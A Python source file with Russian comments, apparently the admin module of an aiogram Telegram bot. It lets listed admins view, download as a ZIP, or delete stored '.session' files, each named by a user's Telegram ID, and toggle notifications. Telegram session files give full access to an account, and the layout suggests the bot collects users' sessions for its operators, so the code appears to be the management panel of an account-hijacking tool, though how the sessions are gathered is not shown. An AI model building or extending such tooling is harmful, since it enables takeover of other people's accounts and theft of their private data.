import os
import glob
import zipfile
import shutil
import logging
from aiogram import Router, Bot, F, types
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.utils.keyboard import InlineKeyboardBuilder

from handlers.states import AdminStates
from handlers.utils import admin_ids, admin_notifications

# Настройка логирования
logger = logging.getLogger(__name__)

# Создаем роутер
router = Router()

# Обработчик для просмотра всех сессий
@router.callback_query(F.data == "all_sessions")
async def show_all_sessions(callback: types.CallbackQuery, state: FSMContext):
    """Показывает список всех сессий"""
    user_id = callback.from_user.id
    
    # Проверяем, является ли пользователь админом
    if str(user_id) not in admin_ids:
        await callback.answer("Доступ запрещен", show_alert=True)
        return
    
    # Получаем список всех файлов сессий
    session_files = glob.glob("sessions/*.session")
    session_count = len(session_files)
    
    # Формируем список сессий
    if session_count > 0:
        # Создаем клавиатуру с опциями
        kb = InlineKeyboardBuilder()
        kb.button(text="📥 Скачать все", callback_data="download_all_sessions")
        kb.button(text="🗑 Удалить все", callback_data="delete_all_sessions")
        kb.button(text="◀️ Назад", callback_data="back_to_admin")
        kb.adjust(1, 1, 1)  # Размещаем кнопки в столбик
        
        # Формируем список пользователей
        user_list = ""
        for i, session_file in enumerate(session_files, 1):
            user_id_from_file = os.path.basename(session_file).replace(".session", "")
            user_list += f"*{i}. Пользователь ID:* `{user_id_from_file}`\n"
        
        await callback.message.edit_text(
            f"*📁 Список сессий ({session_count})*\n\n"
            f"{user_list}\n"
            f"*Выберите действие:*",
            reply_markup=kb.as_markup(),
            parse_mode="Markdown"
        )
    else:
        # Если сессий нет
        kb = InlineKeyboardBuilder()
        kb.button(text="◀️ Назад", callback_data="back_to_admin")
        
        await callback.message.edit_text(
            "*📂 Список сессий пуст*\n\n"
            "*У вас пока нет сохраненных сессий.*",
            reply_markup=kb.as_markup(),
            parse_mode="Markdown"
        )
    
    await callback.answer()

# Обработчик для скачивания всех сессий
@router.callback_query(F.data == "download_all_sessions")
async def download_all_sessions(callback: types.CallbackQuery, state: FSMContext, bot: Bot):
    """Скачивает все сессии в виде ZIP-архива"""
    user_id = callback.from_user.id
    
    # Проверяем, является ли пользователь админом
    if str(user_id) not in admin_ids:
        await callback.answer("Доступ запрещен", show_alert=True)
        return
    
    # Получаем список всех файлов сессий
    session_files = glob.glob("sessions/*.session")
    
    if not session_files:
        await callback.answer("Нет доступных сессий", show_alert=True)
        return
    
    # Создаем временный архив
    zip_path = "sessions/all_sessions.zip"
    with zipfile.ZipFile(zip_path, "w") as zipf:
        for file in session_files:
            # Добавляем файл в архив с его именем
            zipf.write(file, os.path.basename(file))
    
    # Отправляем архив
    with open(zip_path, "rb") as file:
        await bot.send_document(
            user_id,
            types.BufferedInputFile(
                file.read(),
                filename="all_sessions.zip"
            ),
            caption="*📥 Архив со всеми сессиями*",
            parse_mode="Markdown"
        )
    
    # Удаляем временный архив
    if os.path.exists(zip_path):
        os.remove(zip_path)
    
    await callback.answer("Архив отправлен")

# Обработчик для удаления всех сессий
@router.callback_query(F.data == "delete_all_sessions")
async def delete_all_sessions(callback: types.CallbackQuery, state: FSMContext):
    """Удаляет все сессии"""
    user_id = callback.from_user.id
    
    # Проверяем, является ли пользователь админом
    if str(user_id) not in admin_ids:
        await callback.answer("Доступ запрещен", show_alert=True)
        return
    
    # Получаем список всех файлов сессий
    session_files = glob.glob("sessions/*.session")
    
    if not session_files:
        await callback.answer("Нет доступных сессий", show_alert=True)
        return
    
    # Удаляем все файлы сессий
    for file in session_files:
        os.remove(file)
    
    # Возвращаемся к админ-панели
    kb = InlineKeyboardBuilder()
    kb.button(text="📁 Все сессии", callback_data="all_sessions")
    
    # Кнопка включения/отключения уведомлений
    notification_text = "🔕 Отключить уведомления" if admin_notifications else "🔔 Включить уведомления"
    kb.button(text=notification_text, callback_data="toggle_notifications")
    
    # Располагаем кнопки в столбик
    kb.adjust(1)
    
    await callback.message.edit_text(
        "*👑 Панель администратора*\n\n"
        "*✅ Все сессии успешно удалены!*\n\n"
        "*Выберите действие:*",
        reply_markup=kb.as_markup(),
        parse_mode="Markdown"
    )
    
    await callback.answer("Сессии удалены")

# Обработчик для просмотра конкретной сессии
@router.callback_query(F.data.startswith("session_"))
async def process_session(callback: types.CallbackQuery, state: FSMContext, bot: Bot):
    """Обработчик выбора сессии"""
    # Проверяем, является ли пользователь админом
    user_id = callback.from_user.id
    if str(user_id) not in admin_ids:
        await callback.answer("У вас нет доступа к этой функции")
        return
    
    # Извлекаем ID пользователя из callback data
    session_user_id = callback.data.split("_")[1]
    session_path = f"sessions/{session_user_id}"
    
    # Создаем клавиатуру с действиями
    kb = InlineKeyboardBuilder()
    kb.button(text="📥 Скачать сессию", callback_data=f"download_session_{session_user_id}")
    kb.button(text="🔙 Назад к сессиям", callback_data="all_sessions")
    kb.adjust(1)
    
    await callback.message.edit_text(
        f"*👤 Сессия пользователя:* `{session_user_id}`\n\n"
        "*Выберите действие:*",
        reply_markup=kb.as_markup(),
        parse_mode="Markdown"
    )
    
    await callback.answer()

# Обработчик для скачивания конкретной сессии
@router.callback_query(F.data.startswith("download_session_"))
async def process_download_session(callback: types.CallbackQuery, state: FSMContext, bot: Bot):
    """Обработчик скачивания сессии"""
    # Проверяем, является ли пользователь админом
    user_id = callback.from_user.id
    if str(user_id) not in admin_ids:
        await callback.answer("У вас нет доступа к этой функции")
        return
    
    # Извлекаем ID пользователя из callback data
    session_user_id = callback.data.split("_")[2]
    session_path = f"sessions/{session_user_id}.session"
    
    # Проверяем, существует ли файл сессии
    if os.path.exists(session_path):
        # Отправляем файл сессии админу
        with open(session_path, "rb") as file:
            await bot.send_document(
                user_id,
                types.BufferedInputFile(
                    file.read(),
                    filename=f"{session_user_id}.session"
                ),
                caption=f"*📎 Сессия пользователя:* `{session_user_id}`",
                parse_mode="Markdown"
            )
        
        # Создаем клавиатуру для возврата
        kb = InlineKeyboardBuilder()
        kb.button(text="🔙 Назад к сессии", callback_data=f"session_{session_user_id}")
        
        await callback.message.edit_text(
            f"*✅ Сессия пользователя* `{session_user_id}` *отправлена*",
            reply_markup=kb.as_markup(),
            parse_mode="Markdown"
        )
    else:
        # Если файл не существует
        kb = InlineKeyboardBuilder()
        kb.button(text="🔙 Назад к сессиям", callback_data="all_sessions")
        
        await callback.message.edit_text(
            f"*❌ Файл сессии для пользователя* `{session_user_id}` *не найден*",
            reply_markup=kb.as_markup(),
            parse_mode="Markdown"
        )
    
    await callback.answer()

# Обработчик для переключения статуса уведомлений
@router.callback_query(F.data == "toggle_notifications")
async def toggle_notifications(callback: types.CallbackQuery, state: FSMContext):
    """Включает/выключает уведомления администратора"""
    user_id = callback.from_user.id
    
    # Проверяем, является ли пользователь админом
    if str(user_id) not in admin_ids:
        await callback.answer("Доступ запрещен", show_alert=True)
        return
    
    # Переключаем статус уведомлений
    global admin_notifications
    admin_notifications = not admin_notifications
    
    # Обновляем панель администратора
    kb = InlineKeyboardBuilder()
    kb.button(text="📁 Все сессии", callback_data="all_sessions")
    
    # Кнопка включения/отключения уведомлений
    notification_text = "🔕 Отключить уведомления" if admin_notifications else "🔔 Включить уведомления"
    kb.button(text=notification_text, callback_data="toggle_notifications")
    
    # Располагаем кнопки в столбик
    kb.adjust(1)
    
    notification_status = "включены" if admin_notifications else "отключены"
    
    await callback.message.edit_text(
        "*👑 Панель администратора*\n\n"
        f"*ℹ️ Уведомления {notification_status}*\n\n"
        "*Выберите действие:*",
        reply_markup=kb.as_markup(),
        parse_mode="Markdown"
    )
    
    await callback.answer(f"Уведомления {notification_status}")

# Обработчик для возврата в админ-панель
@router.callback_query(F.data == "back_to_admin")
async def back_to_admin(callback: types.CallbackQuery, state: FSMContext):
    """Возвращает в админ-панель"""
    user_id = callback.from_user.id
    
    # Проверяем, является ли пользователь админом
    if str(user_id) not in admin_ids:
        await callback.answer("Доступ запрещен", show_alert=True)
        return
    
    # Создаем клавиатуру админа
    kb = InlineKeyboardBuilder()
    kb.button(text="📁 Все сессии", callback_data="all_sessions")
    
    # Кнопка включения/отключения уведомлений
    notification_text = "🔕 Отключить уведомления" if admin_notifications else "🔔 Включить уведомления"
    kb.button(text=notification_text, callback_data="toggle_notifications")
    
    # Располагаем кнопки в столбик
    kb.adjust(1)
    
    await callback.message.edit_text(
        "*👑 Панель администратора*\n\n"
        "*Выберите действие:*",
        reply_markup=kb.as_markup(),
        parse_mode="Markdown"
    )
    
    await callback.answer()

def register_admin_router(dp):
    """Регистрирует роутер в диспетчере"""
    dp.include_router(router) 